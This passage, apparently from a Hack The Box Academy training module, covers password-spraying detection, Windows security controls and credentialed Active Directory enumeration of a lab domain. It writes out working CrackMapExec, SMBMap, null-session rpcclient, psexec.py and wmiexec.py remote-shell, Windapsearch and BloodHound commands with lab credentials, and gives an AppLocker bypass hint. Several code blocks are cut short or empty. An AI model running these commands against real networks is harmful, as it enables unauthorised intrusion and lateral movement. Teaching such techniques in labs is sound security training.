| `Password Hygiene` | Educating users on selecting difficult to guess passwords such as passphrases can significantly reduce the efficacy of a password spraying attack. Also, using a password filter to restrict common dictionary words, names of months and seasons, and variations on the company's name will make it quite difficult for an attacker to choose a valid password for spraying attempts. |

* * *

## Other Considerations

It is vital to ensure that your domain password lockout policy doesn’t increase the risk of denial of service attacks. If it is very restrictive and requires an administrative intervention to unlock accounts manually, a careless password spray may lock out many accounts within a short period.

* * *

## Detection

Some indicators of external password spraying attacks include many account lockouts in a short period, server or application logs showing many login attempts with valid or non-existent users, or many requests in a short period to a specific application or URL.

In the Domain Controller’s security log, many instances of event ID [4625: An account failed to log on](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625) over a short period may indicate a password spraying attack. Organizations should have rules to correlate many logon failures within a set time interval to trigger an alert. A more savvy attacker may avoid SMB password spraying and instead target LDAP. Organizations should also monitor event ID [4771: Kerberos pre-authentication failed](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4771), which may indicate an LDAP password spraying attempt. To do so, they will need to enable Kerberos logging. This [post](https://www.hub.trimarcsecurity.com/post/trimarc-research-detecting-password-spraying-with-security-event-auditing) details research around detecting password spraying using Windows Security Event Logging.

With these mitigations finely tuned and with logging enabled, an organization will be well-positioned to detect and defend against internal and external password spraying attacks.

* * *

## External Password Spraying

While outside the scope of this module, password spraying is also a common way that attackers use to attempt to gain a foothold on the internet. We have been very successful with this method during penetration tests to gain access to sensitive data through email inboxes or web applications such as externally facing intranet sites. Some common targets include:

- Microsoft 0365
- Outlook Web Exchange
- Exchange Web Access
- Skype for Business
- Lync Server
- Microsoft Remote Desktop Services (RDS) Portals
- Citrix portals using AD authentication
- VDI implementations using AD authentication such as VMware Horizon
- VPN portals (Citrix, SonicWall, OpenVPN, Fortinet, etc. that use AD authentication)
- Custom web applications that use AD authentication

* * *

## Moving Deeper

Now that we have several sets of valid credentials, we can begin digging deeper into the domain by performing credentialed enumeration with various tools. We will walk through several tools that complement each other to give us the most complete and accurate picture of a domain environment. With this information, we will seek to move laterally and vertically in the domain to eventually reach the end goal of our assessment.


# Enumerating Security Controls

* * *

After gaining a foothold, we could use this access to get a feeling for the defensive state of the hosts, enumerate the domain further now that our visibility is not as restricted, and, if necessary, work at "living off the land" by using tools that exist natively on the hosts. It is important to understand the security controls in place in an organization as the products in use can affect the tools we use for our AD enumeration, as well as exploitation and post-exploitation. Understanding the protections we may be up against will help inform our decisions regarding tool usage and assist us in planning our course of action by either avoiding or modifying certain tools. Some organizations have more stringent protections than others, and some do not apply security controls equally throughout. There may be policies applied to certain machines that can make our enumeration more difficult that are not applied on other machines.

Note: This section is intended to showcase possible security controls in place within a domain, but does not have an interactive component. Enumerating and bypassing security controls are outside the scope of this module, but we wanted to give an overview of the possible technologies we may encounter during an assessment.

* * *

## Windows Defender

Windows Defender (or [Microsoft Defender](https://en.wikipedia.org/wiki/Microsoft_Defender) after the Windows 10 May 2020 Update) has greatly improved over the years and, by default, will block tools such as `PowerView`. There are ways to bypass these protections. These ways will be covered in other modules. We can use the built-in PowerShell cmdlet [Get-MpComputerStatus](https://docs.microsoft.com/en-us/powershell/module/defender/get-mpcomputerstatus?view=win10-ps) to get the current Defender status. Here, we can see that the `RealTimeProtectionEnabled` parameter is set to `True`, which means Defender is enabled on the system.

#### Checking the Status of Defender with Get-MpComputerStatus

## AppLocker

An application whitelist is a list of approved software applications or executables that are allowed to be present and run on a system. The goal is to protect the environment from harmful malware and unapproved software that does not align with the specific business needs of an organization. [AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) is Microsoft's application whitelisting solution and gives system administrators control over which applications and files users can run. It provides granular control over executables, scripts, Windows installer files, DLLs, packaged apps, and packed app installers. It is common for organizations to block cmd.exe and PowerShell.exe and write access to certain directories, but this can all be bypassed. Organizations also often focus on blocking the `PowerShell.exe` executable, but forget about the other [PowerShell executable locations](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) such as `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` or `PowerShell_ISE.exe`. We can see that this is the case in the `AppLocker` rules shown below. All Domain Users are disallowed from running the 64-bit PowerShell executable located at:

`%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe`

So, we can merely call it from other locations. Sometimes, we run into more stringent `AppLocker` policies that require more creativity to bypass. These ways will be covered in other modules.

#### Using Get-AppLockerPolicy cmdlet

```powershell
PS C:\htb> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

PathConditions      : {%SYSTEM32%\WINDOWSPOWERSHELL\V1.0\POWERSHELL.EXE}
PathExceptions      : {}

## PowerShell Constrained Language Mode

PowerShell [Constrained Language Mode](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) locks down many of the features needed to use PowerShell effectively, such as blocking COM objects, only allowing approved .NET types, XAML-based workflows, PowerShell classes, and more. We can quickly enumerate whether we are in Full Language Mode or Constrained Language Mode.

#### Enumerating Language Mode

```powershell
PS C:\htb> $ExecutionContext.SessionState.LanguageMode

ConstrainedLanguage

```

* * *

## LAPS

The Microsoft [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899) is used to randomize and rotate local administrator passwords on Windows hosts and prevent lateral movement. We can enumerate what domain users can read the LAPS password set for machines with LAPS installed and what machines do not have LAPS installed. The [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) greatly facilitates this with several functions. One is parsing `ExtendedRights` for all computers with LAPS enabled. This will show groups specifically delegated to read LAPS passwords, which are often users in protected groups. An account that has joined a computer to a domain receives `All Extended Rights` over that host, and this right gives the account the ability to read passwords. Enumeration may show a user account that can read the LAPS password on a host. This can help us target specific AD users who can read LAPS passwords.

#### Using Find-LAPSDelegatedGroups

```powershell
PS C:\htb> Find-LAPSDelegatedGroups

OrgUnit                                             Delegated Groups

```

The `Find-AdmPwdExtendedRights` checks the rights on each computer with LAPS enabled for any groups with read access and users with "All Extended Rights." Users with "All Extended Rights" can read LAPS passwords and may be less protected than users in delegated groups, so this is worth checking for.

#### Using Find-AdmPwdExtendedRights

```powershell
PS C:\htb> Find-AdmPwdExtendedRights

ComputerName                Identity                    Reason
------------                --------                    ------

WS01.INLANEFREIGHT.LOCAL    INLANEFREIGHT\Domain Admins Delegated
WS01.INLANEFREIGHT.LOCAL    INLANEFREIGHT\LAPS Admins   Delegated

```

We can use the `Get-LAPSComputers` function to search for computers that have LAPS enabled when passwords expire, and even the randomized passwords in cleartext if our user has access.

#### Using Get-LAPSComputers

```powershell
PS C:\htb> Get-LAPSComputers

## Conclusion

As we have seen in this section, several other helpful AD enumeration techniques are available to us to determine what protections are in place. It is worth familiarizing yourself with all of these tools and techniques, and adding them to your arsenal of options. Now, let's continue our enumeration of the INLANEFREIGHT.LOCAL domain from a credentialed standpoint.


# Credentialed Enumeration - from Linux

* * *

Now that we have acquired a foothold in the domain, it is time to dig deeper using our low privilege domain user credentials. Since we have a general idea about the domain's userbase and machines, it's time to enumerate the domain in depth. We are interested in information about domain user and computer attributes, group membership, Group Policy Objects, permissions, ACLs, trusts, and more. We have various options available, but the most important thing to remember is that most of these tools will not work without valid domain user credentials at any permission level. So at a minimum, we will have to have acquired a user's cleartext password, NTLM password hash, or SYSTEM access on a domain-joined host.

To follow along, spawn the target at the bottom of this section and SSH to the Linux attack host as the `htb-student` user. For enumeration of the INLANEFREIGHT.LOCAL domain using the tools installed on the ATTACK01 Parrot Linux host, we will use the following credentials: User= `forend` and password= `Klmcargo2`. Once our access is established, it's time to get to work. We'll start with `CrackMapExec`.

* * *

## CrackMapExec

[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) (CME) is a powerful toolset to help with assessing AD environments. It utilizes packages from the Impacket and PowerSploit toolkits to perform its functions. For detailed explanations on using the tool and accompanying modules, see the [wiki](https://github.com/byt3bl33d3r/CrackMapExec/wiki). Don't be afraid to use the `-h` flag to review the available options and syntax.

```

CME offers a help menu for each protocol (i.e., `crackmapexec winrm -h`, etc.). Be sure to review the entire help menu and all possible options. For now, the flags we are interested in are:

- -u Username `The user whose credentials we will use to authenticate`
- -p Password `User's password`
- Target (IP or FQDN) `Target host to enumerate` (in our case, the Domain Controller)
- --users `Specifies to enumerate Domain Users`
- --groups `Specifies to enumerate domain groups`
- --loggedon-users `Attempts to enumerate what users are logged on to a target, if any`

We'll start by using the SMB protocol to enumerate users and groups. We will target the Domain Controller (whose address we uncovered earlier) because it holds all data in the domain database that we are interested in. Make sure you preface all commands with `sudo`.

#### CME - Domain User Enumeration

We start by pointing CME at the Domain Controller and using the credentials for the `forend` user to retrieve a list of all domain users. Notice when it provides us the user information, it includes data points such as the [badPwdCount](https://docs.microsoft.com/en-us/windows/win32/adschema/a-badpwdcount) attribute. This is helpful when performing actions like targeted password spraying. We could build a target user list filtering out any users with their `badPwdCount` attribute above 0 to be extra careful not to lock any accounts out.

```shell
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users

We can also obtain a complete listing of domain groups. We should save all of our output to files to easily access it again later for reporting or use with other tools.

```

The above snippet lists the groups within the domain and the number of users in each. The output also shows the built-in groups on the Domain Controller, such as `Backup Operators`. We can begin to note down groups of interest. Take note of key groups like `Administrators`, `Domain Admins`, `Executives`, any groups that may contain privileged IT admins, etc. These groups will likely contain users with elevated privileges worth targeting during our assessment.

#### CME - Logged On Users

We can also use CME to target other hosts. Let's check out what appears to be a file server to see what users are logged in currently.

We see that many users are logged into this server which is very interesting. We can also see that our user `forend` is a local admin because `(Pwn3d!)` appears after the tool successfully authenticates to the target host. A host like this may be used as a jump host or similar by administrative users. We can see that the user `svc_qualys` is logged in, who we earlier identified as a domain admin. It could be an easy win if we can steal this user's credentials from memory or impersonate them.

As we will see later, `BloodHound` (and other tools such as `PowerView`) can be used to hunt for user sessions. BloodHound is particularly powerful as we can use it to view Domain User sessions graphically and quickly in many ways. Regardless, tools such as CME are great for more targeted enumeration and user hunting.

#### CME Share Searching

We can use the `--shares` flag to enumerate available shares on the remote host and the level of access our user account has to each share (READ or WRITE access). Let's run this against the INLANEFREIGHT.LOCAL Domain Controller.

#### Share Enumeration - Domain Controller

```shell
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)

SMB         172.16.5.5      445    ACADEMY-EA-DC01  ZZZ_archive     READ

```

We see several shares available to us with `READ` access. The `Department Shares`, `User Shares`, and `ZZZ_archive` shares would be worth digging into further as they may contain sensitive data such as passwords or PII. Next, we can dig into the shares and spider each directory looking for files. The module `spider_plus` will dig through each readable share on the host and list all readable files. Let's give it a try.

#### Spider\_plus

```shell
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2
SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Started spidering plus with option:

SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]     OUTPUT: /tmp/cme_spider_plus

```

In the above command, we ran the spider against the `Department Shares`. When completed, CME writes the results to a JSON file located at `/tmp/cme_spider_plus/<ip of host>`. Below we can see a portion of the JSON output. We could dig around for interesting files such as `web.config` files or scripts that may contain passwords. If we wanted to dig further, we could pull those files to see what all resides within, perhaps finding some hardcoded credentials or other sensitive information.

```shell
head -n 10 /tmp/cme_spider_plus/172.16.5.5.json

{
    "Department Shares": {
        "Accounting/Private/AddSelect.bat": {
            "atime_epoch": "2022-03-31 14:44:42",
            "ctime_epoch": "2022-03-31 14:44:39",
            "mtime_epoch": "2022-03-31 15:14:46",
            "size": "278 Bytes"
        },
        "Accounting/Private/ApproveConnect.wmf": {
            "atime_epoch": "2022-03-31 14:45:14",

<SNIP>

```

CME is powerful, and this is only a tiny look at its capabilities; it is worth experimenting with it more against the lab targets. We will utilize CME in various ways as we progress through the remainder of this module. Let's move on and take a look at [SMBMap](https://github.com/ShawnDEvans/smbmap) now.

* * *

## SMBMap

SMBMap is great for enumerating SMB shares from a Linux attack host. It can be used to gather a listing of shares, permissions, and share contents if accessible. Once access is obtained, it can be used to download and upload files and execute remote commands.

Like CME, we can use SMBMap and a set of domain user credentials to check for accessible shares on remote systems. As with other tools, we can type the command `smbmap` `-h` to view the tool usage menu. Aside from listing shares, we can use SMBMap to recursively list directories, list the contents of a directory, search file contents, and more. This can be especially useful when pillaging shares for useful information.

#### SMBMap To Check Access

```shell
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5

[+] IP: 172.16.5.5:445	Name: inlanefreight.local
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	Department Shares                                 	READ ONLY
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	SYSVOL                                            	READ ONLY	Logon server share
	User Shares                                       	READ ONLY
	ZZZ_archive                                       	READ ONLY

```

The above will tell us what our user can access and their permission levels. Like our results from CME, we see that the user `forend` has no access to the DC via the `ADMIN$` or `C$` shares (this is expected for a standard user account), but does have read access over `IPC$`, `NETLOGON`, and `SYSVOL` which is the default in any domain. The other non-standard shares, such as `Department Shares` and the user and archive shares, are most interesting. Let's do a recursive listing of the directories in the `Department Shares` share. We can see, as expected, subdirectories for each department in the company.

#### Recursive List Of All Directories

```shell
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only

[+] IP: 172.16.5.5:445	Name: inlanefreight.local

	dr--r--r--                0 Thu Mar 31 15:16:18 2022	Warehouse

    <SNIP>

```

As the recursive listing dives deeper, it will show you the output of all subdirectories within the higher-level directories. The use of `--dir-only` provided only the output of all directories and did not list all files. Try this against other shares on the Domain Controller and see what you can find.

Now that we've covered shares, let's look at `RPCClient`.

* * *

## rpcclient

[rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) is a handy tool created for use with the Samba protocol and to provide extra functionality via MS-RPC. It can enumerate, add, change, and even remove objects from AD. It is highly versatile; we just have to find the correct command to issue for what we want to accomplish. The man page for rpcclient is very helpful for this; just type `man rpcclient` into your attack host's shell and review the options available. Let's cover a few rpcclient functions that can be helpful during a penetration test.

Due to SMB NULL sessions (covered in-depth in the password spraying sections) on some of our hosts, we can perform authenticated or unauthenticated enumeration using rpcclient in the INLANEFREIGHT.LOCAL domain. An example of using rpcclient from an unauthenticated standpoint (if this configuration exists in our target domain) would be:

```bash
rpcclient -U "" -N 172.16.5.5

```

The above will provide us with a bound connection, and we should be greeted with a new prompt to start unleashing the power of rpcclient.

#### SMB NULL Session with rpcclient

![image](https://academy.hackthebox.com/storage/modules/143/rpcclient.png)

From here, we can begin to enumerate any number of different things. Let's start with domain users.

#### rpcclient Enumeration

While looking at users in rpcclient, you may notice a field called `rid:` beside each user. A [Relative Identifier (RID)](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers) is a unique identifier (represented in hexadecimal format) utilized by Windows to track and identify objects. To explain how this fits in, let's look at the examples below:

- The [SID](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers) for the INLANEFREIGHT.LOCAL domain is: `S-1-5-21-3842939050-3880317879-2865463114`.
- When an object is created within a domain, the number above (SID) will be combined with a RID to make a unique value used to represent the object.
- So the domain user `htb-student` with a RID:\[0x457\] Hex 0x457 would = decimal `1111`, will have a full user SID of: `S-1-5-21-3842939050-3880317879-2865463114-1111`.
- This is unique to the `htb-student` object in the INLANEFREIGHT.LOCAL domain and you will never see this paired value tied to another object in this domain or any other.

However, there are accounts that you will notice that have the same RID regardless of what host you are on. Accounts like the built-in Administrator for a domain will have a RID \[administrator\] rid:\[0x1f4\], which, when converted to a decimal value, equals `500`. The built-in Administrator account will always have the RID value `Hex 0x1f4`, or 500. This will always be the case. Since this value is unique to an object, we can use it to enumerate further information about it from the domain. Let's give it a try again with rpcclient. We will dig a bit targeting the `htb-student` user.

#### RPCClient User Enumeration By RID

```shell
rpcclient $> queryuser 0x457

        User Name   :   htb-student
        Full Name   :   Htb Student
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :
        Workstations:
        Comment     :
        Remote Dial :
        Logon Time               :      Wed, 02 Mar 2022 15:34:32 EST
        Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST
        Kickoff Time             :      Wed, 13 Sep 30828 22:48:05 EDT
        Password last set Time   :      Wed, 27 Oct 2021 12:26:52 EDT
        Password can change Time :      Thu, 28 Oct 2021 12:26:52 EDT
        Password must change Time:      Wed, 13 Sep 30828 22:48:05 EDT
        unknown_2[0..31]...
        user_rid :      0x457
        group_rid:      0x201
        acb_info :      0x00000010
        fields_present: 0x00ffffff
        logon_divs:     168
        bad_password_count:     0x00000000
        logon_count:    0x0000001d
        padding1[0..7]...
        logon_hrs[0..21]...

```

When we searched for information using the `queryuser` command against the RID `0x457`, RPC returned the user information for `htb-student` as expected. This wasn't hard since we already knew the RID for `htb-student`. If we wished to enumerate all users to gather the RIDs for more than just one, we would use the `enumdomusers` command.

#### Enumdomusers

```shell
rpcclient $> enumdomusers

user:[administrator] rid:[0x1f4]
user:[guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[lab_adm] rid:[0x3e9]
user:[htb-student] rid:[0x457]
user:[avazquez] rid:[0x458]
user:[pfalcon] rid:[0x459]
user:[fanthony] rid:[0x45a]
user:[wdillard] rid:[0x45b]
user:[lbradford] rid:[0x45c]
user:[sgage] rid:[0x45d]
user:[asanchez] rid:[0x45e]
user:[dbranch] rid:[0x45f]
user:[ccruz] rid:[0x460]
user:[njohnson] rid:[0x461]
user:[mholliday] rid:[0x462]

<SNIP>

```

Using it in this manner will print out all domain users by name and RID. Our enumeration can go into great detail utilizing rpcclient. We could even start performing actions such as editing users and groups or adding our own into the domain, but this is out of scope for this module. For now, we just want to perform domain enumeration to validate our findings. Take some time to play with the other rpcclient functions and see the results they produce. For more information on topics such as SIDs, RIDs, and other core components of AD, it would be worthwhile to check out the [Introduction to Active Directory](https://academy.hackthebox.com/course/preview/introduction-to-active-directory) module. Now, it's time to plunge into Impacket in all its glory.

* * *

## Impacket Toolkit

Impacket is a versatile toolkit that provides us with many different ways to enumerate, interact, and exploit Windows protocols and find the information we need using Python. The tool is actively maintained and has many contributors, especially when new attack techniques arise. We could perform many other actions with Impacket, but we will only highlight a few in this section; [wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py) and [psexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py). Earlier in the poisoning section, we grabbed a hash for the user `wley` with `Responder` and cracked it to obtain the password `transporter@4`. We will see in the next section that this user is a local admin on the `ACADEMY-EA-FILE` host. We will utilize the credentials for the next few actions.

#### Psexec.py

One of the most useful tools in the Impacket suite is `psexec.py`. Psexec.py is a clone of the Sysinternals psexec executable, but works slightly differently from the original. The tool creates a remote service by uploading a randomly-named executable to the `ADMIN$` share on the target host. It then registers the service via `RPC` and the `Windows Service Control Manager`. Once established, communication happens over a named pipe, providing an interactive remote shell as `SYSTEM` on the victim host.

#### Using psexec.py

To connect to a host with psexec.py, we need credentials for a user with local administrator privileges.

```bash
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125

```

![image](https://academy.hackthebox.com/storage/modules/143/psexec-action.png)

Once we execute the psexec module, it drops us into the `system32` directory on the target host. We ran the `whoami` command to verify, and it confirmed that we landed on the host as `SYSTEM`. From here, we can perform most any task on this host; anything from further enumeration to persistence and lateral movement. Let's give another Impacket module a try: `wmiexec.py`.

#### wmiexec.py

Wmiexec.py utilizes a semi-interactive shell where commands are executed through [Windows Management Instrumentation](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page). It does not drop any files or executables on the target host and generates fewer logs than other modules. After connecting, it runs as the local admin user we connected with (this can be less obvious to someone hunting for an intrusion than seeing SYSTEM executing many commands). This is a more stealthy approach to execution on hosts than other tools, but would still likely be caught by most modern anti-virus and EDR systems. We will use the same account as with psexec.py to access the host.

#### Using wmiexec.py

```bash
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5

```

![text](https://academy.hackthebox.com/storage/modules/143/wmiexec-action.png)

Note that this shell environment is not fully interactive, so each command issued will execute a new cmd.exe from WMI and execute your command. The downside of this is that if a vigilant defender checks event logs and looks at event ID [4688: A new process has been created](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688), they will see a new process created to spawn cmd.exe and issue a command. This isn't always malicious activity since many organizations utilize WMI to administer computers, but it can be a tip-off in an investigation. In the image above, it's also apparent that the process is running under the context of user `wley` on the host, not as SYSTEM. Impacket is an immensely valuable tool that has plenty of use cases. We will see many other tools in the Impacket toolkit throughout the remainder of this module. As a pentester working with Windows hosts, this tool should always be in our arsenal. Let's move on to the next tool, `Windapsearch`.

* * *

## Windapsearch

[Windapsearch](https://github.com/ropnop/windapsearch) is another handy Python script we can use to enumerate users, groups, and computers from a Windows domain by utilizing LDAP queries. It is present in our attack host's /opt/windapsearch/ directory.

#### Windapsearch Help

```shell
windapsearch.py -h

usage: windapsearch.py [-h] [-d DOMAIN] [--dc-ip DC_IP] [-u USER]

  -C, --computers       Enumerate all AD Computers

  <SNIP>

```

We have several options with Windapsearch to perform standard enumeration (dumping users, computers, and groups) and more detailed enumeration. The `--da` (enumerate domain admins group members ) option and the `-PU` ( find privileged users) options. The `-PU` option is interesting because it will perform a recursive search for users with nested group membership.

#### Windapsearch - Domain Admins

```shell
python3 windapsearch.py --dc-ip 172.16.5.5 -u [email protected] -p Klmcargo2 --da

[+] Using Domain Controller at: 172.16.5.5

[+]	Found 28 Domain Admins:

cn: Administrator
userPrincipalName: [email protected]

cn: lab_adm

cn: Matthew Morgan
userPrincipalName: [email protected]

<SNIP>

```

From the results in the shell above, we can see that it enumerated 28 users from the Domain Admins group. Take note of a few users we have already seen before and may even have a hash or cleartext password like `wley`, `svc_qualys`, and `lab_adm`.

To identify more potential users, we can run the tool with the `-PU` flag and check for users with elevated privileges that may have gone unnoticed. This is a great check for reporting since it will most likely inform the customer of users with excess privileges from nested group membership.

#### Windapsearch - Privileged Users

```shell
python3 windapsearch.py --dc-ip 172.16.5.5 -u [email protected] -p Klmcargo2 -PU

```

You'll notice that it performed mutations against common elevated group names in different languages. This output gives an example of the dangers of nested group membership, and this will become more evident when we work with BloodHound graphics to visualize this.

## Bloodhound.py

Once we have domain credentials, we can run the [BloodHound.py](https://github.com/fox-it/BloodHound.py) BloodHound ingestor from our Linux attack host. BloodHound is one of, if not the most impactful tools ever released for auditing Active Directory security, and it is hugely beneficial for us as penetration testers. We can take large amounts of data that would be time-consuming to sift through and create graphical representations or "attack paths" of where access with a particular user may lead. We will often find nuanced flaws in an AD environment that would have been missed without the ability to run queries with the BloodHound GUI tool and visualize issues. The tool uses [graph theory](https://en.wikipedia.org/wiki/Graph_theory) to visually represent relationships and uncover attack paths that would have been difficult, or even impossible to detect with other tools. The tool consists of two parts: the [SharpHound collector](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) written in C# for use on Windows systems, or for this section, the BloodHound.py collector (also referred to as an `ingestor`) and the [BloodHound](https://github.com/BloodHoundAD/BloodHound/releases) GUI tool which allows us to upload collected data in the form of JSON files. Once uploaded, we can run various pre-built queries or write custom queries using [Cypher language](https://blog.cptjesus.com/posts/introtocypher). The tool collects data from AD such as users, groups, computers, group membership, GPOs, ACLs, domain trusts, local admin access, user sessions, computer and user properties, RDP access, WinRM access, etc.

It was initially only released with a PowerShell collector, so it had to be run from a Windows host. Eventually, a Python port (which requires Impacket, `ldap3`, and `dnspython`) was released by a community member. This helped immensely during penetration tests when we have valid domain credentials, but do not have rights to access a domain-joined Windows host or do not have a Windows attack host to run the SharpHound collector from. This also helps us not have to run the collector from a domain host, which could potentially be blocked or set off alerts (though even running it from our attack host will most likely set off alarms in well-protected environments).

Running `bloodhound-python -h` from our Linux attack host will show us the options available.

#### BloodHound.py Options

```shell
bloodhound-python -h

usage: bloodhound-python [-h] [-c COLLECTIONMETHOD] [-u USERNAME]
                         [-p PASSWORD] [-k] [--hashes HASHES] [-ns NAMESERVER]
                         [--dns-tcp] [--dns-timeout DNS_TIMEOUT] [-d DOMAIN]
                         [-dc HOST] [-gc HOST] [-w WORKERS] [-v]
                         [--disable-pooling] [--disable-autogc] [--zip]

Python based ingestor for BloodHound
For help or reporting issues, visit https://github.com/Fox-IT/BloodHound.py

optional arguments:
  -h, --help            show this help message and exit
  -c COLLECTIONMETHOD, --collectionmethod COLLECTIONMETHOD
                        Which information to collect. Supported: Group,
                        LocalAdmin, Session, Trusts, Default (all previous),
                        DCOnly (no computer connections), DCOM, RDP,PSRemote,
                        LoggedOn, ObjectProps, ACL, All (all except LoggedOn).
                        You can specify more than one by separating them with
                        a comma. (default: Default)
  -u USERNAME, --username USERNAME
                        Username. Format: username[@domain]; If the domain is
                        unspecified, the current domain is used.
  -p PASSWORD, --password PASSWORD
                        Password

  <SNIP>

```

As we can see the tool accepts various collection methods with the `-c` or `--collectionmethod` flag. We can retrieve specific data such as user sessions, users and groups, object properties, ACLS, or select `all` to gather as much data as possible. Let's run it this way.

#### Executing BloodHound.py

```shell
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all

INFO: Found AD domain: inlanefreight.local
INFO: Connecting to LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
INFO: Found 1 domains
INFO: Found 2 domains in the forest
INFO: Found 564 computers
INFO: Connecting to LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
INFO: Found 2951 users
INFO: Connecting to GC LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
INFO: Found 183 groups
INFO: Found 2 trusts
INFO: Starting computer enumeration with 10 workers

<SNIP>

```

The command above executed Bloodhound.py with the user `forend`. We specified our nameserver as the Domain Controller with the `-ns` flag and the domain, INLANEFREIGHt.LOCAL with the `-d` flag. The `-c all` flag told the tool to run all checks. Once the script finishes, we will see the output files in the current working directory in the format of <date\_object.json>.

#### Viewing the Results

```shell
ls

20220307163102_computers.json  20220307163102_domains.json  20220307163102_groups.json  20220307163102_users.json

```

#### Upload the Zip File into the BloodHound GUI

We could then type `sudo neo4j start` to start the [neo4j](https://neo4j.com/) service, firing up the database we'll load the data into and also run Cypher queries against.

Next, we can type `bloodhound` from our Linux attack host when logged in using `freerdp` to start the BloodHound GUI application and upload the data. The credentials are pre-populated on the Linux attack host, but if for some reason a credential prompt is shown, use:

- `user == neo4j` / `pass == HTB_@cademy_stdnt!`.

Once all of the above is done, we should have the BloodHound GUI tool loaded with a blank slate. Now we need to upload the data. We can either upload each JSON file one by one or zip them first with a command such as `zip -r ilfreight_bh.zip *.json` and upload the Zip file. We do this by clicking the `Upload Data` button on the right side of the window (green arrow). When the file browser window pops up to select a file, choose the zip file (or each JSON file) (red arrow) and hit `Open`.

#### Uploading the Zip File

![image](https://academy.hackthebox.com/storage/modules/143/bh-injest.png)

Now that the data is loaded, we can use the Analysis tab to run queries against the database. These queries can be custom and specific to what you decide using [custom Cypher queries](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/). There are many great cheat sheets to help us here. We will discuss custom Cypher queries more in a later section. As seen below, we can use the built-in `Path Finding` queries on the `Analysis tab` on the `Left` side of the window.

#### Searching for Relationships

![image](https://academy.hackthebox.com/storage/modules/143/bh-analysis.png)

The query chosen to produce the map above was `Find Shortest Paths To Domain Admins`. It will give us any logical paths it finds through users/groups/hosts/ACLs/GPOs, etc., relationships that will likely allow us to escalate to Domain Administrator privileges or equivalent. This will be extremely helpful when planning our next steps for lateral movement through the network. Take some time to experiment with the various features: look at the `Database Info` tab after uploading data, search for a node such as `Domain Users` and, scroll through all of the options under the `Node Info` tab, check out the pre-built queries under the `Analysis` tab, many which are powerful and can quickly find various ways to domain takeover. Finally, experiment with some custom Cypher queries by selecting some interesting ones from the Cypher cheatsheet linked above, pasting them into the `Raw Query` box at the bottom, and hitting enter. You can also play with the `Settings` menu by clicking the gear icon on the right side of the screen and adjusting how nodes and edges are displayed, enable query debug mode, and enable dark mode. Throughout the remainder of this module, we will use BloodHound in various ways, but for a dedicated study on the BloodHound tool, check out the [Active Directory BloodHound](https://academy.hackthebox.com/course/preview/active-directory-bloodhound) module.

In the next section, we will cover running the SharpHound collector from a domain-joined Windows host and work through some examples of working with the data in the BloodHound GUI.

* * *

We experimented with several new tools for domain enumeration from a Linux host. The following section will cover several more tools we can use from a domain-joined Windows host. As a quick note, if you haven't checked out the [WADComs project](https://wadcoms.github.io/) yet, you definitely should. It is an interactive cheat sheet for many of the tools we will cover (and more) in this module. It's hugely helpful when you can't remember exact command syntax or are trying out a tool for the first time. Worth bookmarking and even [contributing](https://wadcoms.github.io/contribute/) to!

Now, let's switch gears and start digging into the INLANEFREIGHT.LOCAL domain from our Windows attack host.


# Credentialed Enumeration - from Windows

* * *

